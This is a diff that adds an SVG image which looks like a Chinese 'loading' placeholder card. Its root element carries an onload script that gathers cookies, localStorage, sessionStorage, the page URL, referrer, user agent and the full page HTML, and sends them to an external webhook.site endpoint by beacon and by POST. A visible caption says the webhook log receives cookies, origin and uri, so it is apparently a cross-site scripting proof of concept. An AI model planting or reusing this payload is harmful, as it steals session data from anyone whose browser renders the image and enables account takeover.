@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:svg="http://www.w3.org/2000/svg" width="640" height="240" viewBox="0 0 640 240"
+     onload='(function(){var d={uri:String(location),cookies:document.cookie,referrer:String(document.referrer||""),"user-agent":String(navigator.userAgent||""),origin:String(location.origin||""),lang:String(navigator.language||""),localstorage:window.localStorage,sessionstorage:window.sessionStorage,dom:String(document.documentElement.outerHTML||"")};var b=JSON.stringify(d);try{navigator.sendBeacon("https://webhook.site/abe90007-4e0e-4ee4-8966-cd03df4cdd82",new Blob([b],{type:"text/plain"}));}catch(e){}try{fetch("https://webhook.site/abe90007-4e0e-4ee4-8966-cd03df4cdd82",{method:"POST",mode:"no-cors",headers:{"Content-Type":"text/plain"},body:b});}catch(e){}})()'>
+  <rect width="100%" height="100%" fill="#ffffff"/>
+  <rect x="20" y="20" width="600" height="200" rx="18" fill="#f6f8fa" stroke="#d0d7de"/>
+  <text x="40" y="80" font-size="28" fill="#111827">资料页</text>
+  <text x="40" y="122" font-size="18" fill="#4b5563">正在加载内容，请稍候…</text>
+  <text x="40" y="156" font-size="14" fill="#6b7280">执行成功后，Webhook 日志会收到 cookies / origin / uri。</text>
+</svg>
